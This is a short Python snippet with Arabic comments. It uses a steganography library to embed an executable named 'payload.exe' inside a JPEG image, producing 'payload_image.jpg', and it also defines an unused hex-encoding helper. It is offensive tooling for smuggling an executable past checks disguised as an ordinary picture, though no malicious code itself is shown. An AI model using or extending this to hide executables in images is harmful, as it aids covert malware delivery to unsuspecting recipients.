import codecs

def to_hex(s):
    return codecs.encode(s.encode(), 'hex').decode()

# ثم قم بتحديث باقي الكود وفقًا لذلك
from steganography.steganography import Steganography

# مسار الصورة الأصلية
input_image = "images/original.jpg"
# مسار الصورة الناتجة بعد الحقن
output_image = "images/payload_image.jpg"
# مسار الملف التنفيذي الذي سيتم حقنه
payload = "dist/payload.exe"

# حقن الملف التنفيذي داخل الصورة
Steganography.encode(input_image, output_image, payload)
